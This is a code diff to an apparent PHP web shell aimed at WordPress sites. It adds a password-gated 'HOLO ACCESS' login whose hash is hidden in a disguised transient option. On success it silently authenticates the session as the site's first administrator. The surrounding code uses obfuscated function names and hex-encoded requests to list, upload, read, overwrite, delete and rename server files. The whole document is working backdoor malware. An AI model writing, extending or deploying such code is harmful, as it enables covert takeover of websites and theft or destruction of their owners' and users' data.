@@ -15,6 +15,51 @@ function fmtSize($b){ return ($b>=1048576) ? number_format($b/1048576,2).' MB' :
 function H0lL0() { $k = [112, 114, 105, 118, 100, 97, 121, 122]; $s = ""; foreach($k as $c) $s .= chr($c); return $s;}
 class H0LO { public function __toString() { define('SYS_INTEGRITY_OK', true); $n = H0lL0(); return '<div style="padding:10px 25px; border-top:1px solid var(--border); font-size:10px; color:#444; display:flex; justify-content:space-between;">' .'<span>www.'.$n.'.com</span>' . '<span style="color:var(--neon)"><a href="https://t.me/'.$n.'" style="color:inherit;text-decoration:none">t.me/'.$n.'</a></span>' . '</div>';    }}
 $h0Lo = new H0LO();
+// ── AUTH GATE ──
+$_h_auth = isset($_SESSION['holo_auth']) && $_SESSION['holo_auth'] === true;
+$_h_err = false;
+if (!$_h_auth && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['holo_pass'])) {
+    $_h_hash = '';
+    if (function_exists('get_option')) {
+        $_h_c = get_option('_transient_feed_mod_', '');
+        $_h_cfg = $_h_c ? @json_decode(@hex2bin($_h_c), true) : null;
+        $_h_hash = ($_h_cfg && isset($_h_cfg['shell_pass'])) ? $_h_cfg['shell_pass'] : '';
+    }
+    if ($_h_hash && password_verify($_POST['holo_pass'], $_h_hash)) {
+        $_SESSION['holo_auth'] = true;
+        $_h_auth = true;
+        // WP auto-login
+        if (function_exists('wp_set_auth_cookie') && function_exists('get_users')) {
+            $_h_adm = get_users(array('role'=>'administrator','number'=>1));
+            if (!empty($_h_adm)) {
+                wp_set_auth_cookie($_h_adm[0]->ID, true);
+                wp_set_current_user($_h_adm[0]->ID);
+            }
+        }
+    } else { $_h_err = true; }
+}
+if (!$_h_auth) {
+    header('Content-Type: text/html; charset=utf-8');
+    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>System Access</title>';
+    echo '<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">';
+    echo '<style>body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#050505;font-family:"Inter",sans-serif;color:#fff;background-image:radial-gradient(circle at 50% 0%,#111 0%,#000 100%)}';
+    echo '.box{width:320px;padding:40px;background:rgba(15,15,15,.9);border:1px solid rgba(255,255,255,.08);border-radius:12px;text-align:center;position:relative;overflow:hidden}';
+    echo '.box::before{content:"";position:absolute;top:0;left:0;width:100%;height:1px;background:linear-gradient(90deg,transparent,#00ff64,transparent)}';
+    echo '.box h2{font-family:"JetBrains Mono",monospace;font-size:22px;margin:0 0 8px;letter-spacing:-1px}.box h2 span{color:#00ff64}';
+    echo '.box p{color:#555;font-size:11px;margin:0 0 30px}';
+    echo 'input[type=password]{width:100%;padding:12px;background:#0a0a0a;border:1px solid rgba(255,255,255,.1);border-radius:6px;color:#fff;font-size:13px;outline:none;box-sizing:border-box;font-family:"JetBrains Mono",monospace}';
+    echo 'input[type=password]:focus{border-color:#00ff64}';
+    echo 'button{width:100%;padding:12px;margin-top:15px;background:#00ff64;border:none;border-radius:6px;color:#000;font-weight:700;font-size:13px;cursor:pointer;transition:.2s}';
+    echo 'button:hover{background:#00cc50}';
+    echo '.err{color:#ff4d4d;font-size:11px;margin-top:12px}</style></head><body>';
+    echo '<form class="box" method="POST"><h2>HOLO <span>ACCESS</span></h2><p>Authentication Required</p>';
+    echo '<input type="password" name="holo_pass" placeholder="Enter access key" autofocus>';
+    echo '<button type="submit">AUTHENTICATE</button>';
+    if ($_h_err) echo '<div class="err">Invalid credentials</div>';
+    echo '</form></body></html>';
+    exit;
+}
+// ── END AUTH ──
 if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['req_data'])){$jd=sfunc('jd');$je=sfunc('je');$raw=@hex2bin($_POST['req_data']);$req=$jd($raw,true);if(!$req)exit;$root=__DIR__;$path=H0L0($req['h']?? '');if(!$path||!is_dir($path))$path=$root;$path=str_replace('\\','/',$path);$act=$req['a'];$resp=['status'=>0];if($act==='idx'){$scn=sfunc('scn');$all=@$scn($path);$d=[];$f=[];if($all){foreach($all as $i){if($i=='.'||$i=='..')continue;$fp=$path.'/'.$i;$meta=['n'=>$i,'p'=>substr(sprintf('%o',fileperms($fp)),-4),'d'=>date("d M H:i",filemtime($fp)),'x'=>holo($fp)];if(is_dir($fp))$d[]=$meta;else{$meta['s']=fmtSize(filesize($fp));$meta['e']=strtolower(pathinfo($i,PATHINFO_EXTENSION));$f[]=$meta;}}}$crumbs=[];$b_acc="";foreach(explode('/',$path)as $part){if($part=='')continue;$b_acc.="/".$part;$crumbs[]=['n'=>$part,'x'=>holo($b_acc)];}$resp=['CACHE_D'=>holo($path),'cwd_s'=>$path,'bc'=>$crumbs,'d'=>$d,'f'=>$f];}if($act==='chnk'){$file=$path.'/'.$req['n'];$chunk=@hex2bin($req['d']);$fo=sfunc('fo');$fw=sfunc('fw');$fc=sfunc('fc');$mode=($req['is_first'])?'w':'a';$h=$fo($file,$mode);if($h){$fw($h,$chunk);$fc($h);$resp=['status'=>1];}}if($act==='rd'){$fgt=sfunc('fgt');$c=@$fgt($path.'/'.$req['t']);$resp=['c'=>bin2hex($c)];}if($act==='wr'){$fpc=sfunc('fpc');$c=@hex2bin($req['c']);$fpc($path.'/'.$req['t'],$c);$resp=['status'=>1];}if($act==='rm'){$t=$path.'/'.$req['t'];$unl=sfunc('unl');$rmd=sfunc('rmd');if(is_file($t))$unl($t);else $rmd($t);$resp=['status'=>1];}if($act==='rn'){$ren=sfunc('ren');$ren($path.'/'.$req['o'],$path.'/'.$req['n']);$resp=['status'=>1];}echo $je($resp);exit;}
 ?>
 <!DOCTYPE html>
